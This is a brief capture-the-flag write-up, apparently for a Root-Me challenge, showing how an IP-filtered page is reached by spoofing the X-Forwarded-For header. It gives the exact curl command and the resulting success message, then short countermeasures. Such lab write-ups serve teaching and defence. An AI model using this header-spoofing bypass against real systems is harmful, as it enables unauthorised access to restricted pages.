Title: Bypassing IP Filtering with HTTP Headers Injection
Primary topic: Web Exploitation
Secondary topic: HTTP Headers Injection
Tools used: cURL
Keywords: IP filtering, load-balancer, proxy

#overview
Only local users will be able to access the page

---

#analysis
In this challenge we will study the bypassing of IP filtering by a well-known technique of HTTP headers injection. Some of these headers allow you to specify that the client’s IP address is different from the source IP address in the packet received by the server. These headers are particularly useful when the connections go through a load-balancer or a proxy. However we can also use these headers to indicate the IP we want. 

#attack_execution
So we will try request with CURL and this HTTP header!

#code
curl 'http://challenge01.root-me.org/web-serveur/ch68/' --header 'X-Forwarded-For: 192.168.1.1'

#exploitation
And we get :

Well done validation password is : <strong>FLAGFLAGFLAGFLAGFLAGFLAG</strong>

---

#countermeasures
To prevent HTTP headers injection attacks, it's important to sanitize and validate all user input, including HTTP headers. Additionally, web application firewalls (WAFs) can be used to detect and block malicious requests that contain suspicious headers.